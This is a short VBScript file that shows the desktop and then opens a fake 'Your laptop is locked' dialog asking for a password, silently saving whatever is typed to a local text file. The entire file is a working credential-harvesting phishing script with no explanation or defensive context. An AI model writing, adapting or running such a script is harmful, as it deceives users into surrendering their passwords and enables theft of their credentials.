
Set object = CreateObject("Shell.Application")

object.ToggleDesktop


Const ForReading = 1, ForWriting = 2, ForAppending = 8, CreateIfNeeded = true
set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(".txt", ForWriting, CreateIfNeeded)

dim fname 
fname = inputbox("Your laptop is locked. Type password to continue")
file.write fname
file.close
